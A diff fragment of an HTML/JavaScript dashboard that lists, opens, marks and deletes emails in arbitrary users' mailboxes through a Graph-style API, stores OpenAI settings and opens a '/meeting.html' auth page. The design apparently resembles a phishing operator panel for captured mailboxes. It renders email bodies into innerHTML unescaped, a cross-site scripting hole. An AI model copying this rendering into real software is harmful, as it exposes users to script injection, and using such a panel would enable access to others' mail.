+                        <div style="padding:16px; border-bottom:1px solid #1e293b; display:flex; justify-content:space-between;">
+                            <h3>${escapeHtml(email.subject || '(No subject)')}</h3>
+                            <button class="btn btn-outline" onclick="this.closest('div').parentElement.remove()">✕</button>
+                        </div>
+                        <div style="padding:20px;">
+                            <div style="margin-bottom:16px;">
+                                <strong>From:</strong> ${escapeHtml(email.from?.emailAddress?.name || email.from?.emailAddress?.address)}<br>
+                                <strong>To:</strong> ${escapeHtml(email.toRecipients?.map(r => r.emailAddress.address).join(', ') || 'Unknown')}<br>
+                                <strong>Date:</strong> ${new Date(email.receivedDateTime).toLocaleString()}
+                            </div>
+                            <div style="border-top:1px solid #1e293b; padding-top:16px;">
+                                ${email.body?.content || email.bodyPreview || 'No content'}
+                            </div>
+                            <div style="margin-top:20px; display:flex; gap:10px;">
+                                <button class="btn btn-primary" onclick="replyToEmail('${email.id}')">↩️ Reply</button>
+                                <button class="btn btn-success" onclick="markAsRead('${email.id}')">✓ Mark Read</button>
+                                <button class="btn btn-danger" onclick="deleteEmail('${email.id}')">🗑️ Delete</button>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } catch (err) {
+                modal.innerHTML = `<div style="background:#111827; border-radius:16px; padding:20px;"><p>❌ Failed to load message: ${err.message}</p><button class="btn btn-primary" onclick="this.closest('div').parentElement.remove()">Close</button></div>`;
+            }
+        }
+        
+        async function replyToEmail(messageId) {
+            alert('Reply feature - compose your message');
+        }
+        
+        async function markAsRead(messageId) {
+            await apiCall(`/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`, {
+                method: 'PATCH',
+                body: JSON.stringify({ isRead: true })
+            });
+            loadFolderEmails(currentMailboxEmail, currentFolderId);
+        }
+        
+        async function deleteEmail(messageId) {
+            if (!confirm('Delete this email?')) return;
+            await apiCall(`/api/mail/message/${encodeURIComponent(currentMailboxEmail)}/${messageId}`, { method: 'DELETE' });
+            loadFolderEmails(currentMailboxEmail, currentFolderId);
+        }
+        
+        async function generateAIEmailSummary(emails) {
+            alert('AI summarizer would analyze these emails and provide a summary.');
+        }
+        
+        function closeMailboxModal() {
+            document.getElementById('mailboxModal').classList.remove('open');
+        }
+        
+        // ============================================
+        // Settings
+        // ============================================
+        async function loadSettings() {
+            const settings = await apiCall('/api/settings');
+            if (settings) {
+                document.getElementById('activeResource').value = settings.active_resource || 'graph';
+                document.getElementById('apiVersion').value = settings.api_version || '2';
+                document.getElementById('openaiEnabled').value = settings.openai_enabled ? 'true' : 'false';
+                document.getElementById('openaiApiKey').value = settings.openai_api_key || '';
+                document.getElementById('openaiModel').value = settings.openai_model || 'gpt-3.5-turbo';
+                document.getElementById('openaiMaxTokens').value = settings.openai_max_tokens || 500;
+                document.getElementById('openaiTemperature').value = settings.openai_temperature || 0.7;
+                document.getElementById('tempValue').innerHTML = settings.openai_temperature || 0.7;
+            }
+        }
+        
+        async function saveResourceSettings() {
+            const settings = {
+                active_resource: document.getElementById('activeResource').value,
+                api_version: document.getElementById('apiVersion').value
+            };
+            await apiCall('/api/resource/settings', { method: 'POST', body: JSON.stringify(settings) });
+            alert('Resource settings saved!');
+        }
+        
+        async function saveOpenAISettings() {
+            const settings = {
+                enabled: document.getElementById('openaiEnabled').value === 'true',
+                api_key: document.getElementById('openaiApiKey').value,
+                model: document.getElementById('openaiModel').value,
+                max_tokens: parseInt(document.getElementById('openaiMaxTokens').value),
+                temperature: parseFloat(document.getElementById('openaiTemperature').value)
+            };
+            await apiCall('/api/openai/settings', { method: 'POST', body: JSON.stringify(settings) });
+            alert('OpenAI settings saved!');
+        }
+        
+        document.getElementById('openaiTemperature').addEventListener('input', function() {
+            document.getElementById('tempValue').innerHTML = this.value;
+        });
+        
+        // ============================================
+        // Auth Page URL
+        // ============================================
+        window.openAuthPage = function() {
+            window.open('/meeting.html', '_blank', 'width=600,height=700');
+        };
+        
+        // Initial load
+        loadDashboard();
+    </script>
 </body>
 </html>
